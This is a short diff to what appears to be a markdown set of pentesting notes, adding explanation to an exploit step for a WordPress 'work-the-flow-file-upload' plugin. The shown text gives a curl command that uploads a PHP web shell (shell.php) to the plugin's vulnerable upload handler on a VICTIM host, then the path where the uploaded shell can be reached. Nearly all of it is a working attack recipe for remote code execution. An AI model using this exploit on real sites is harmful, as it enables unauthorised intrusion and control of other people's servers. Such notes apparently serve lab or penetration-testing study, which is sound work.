@@ -125,6 +125,9 @@ echo "<pre>$output</pre>";
 - __For the `flow file upload` plugin__
   - > __use the above php shell script__
   - __`curl -k -X POST -F "action=upload" -F "files=@./shell.php" http://VICTIM/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php`__
+  - > __This curl command will upload the shell.php__
+  - __Endpoint for the file upload__
+    - __`http://VICTIM/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/`__
 
 
 
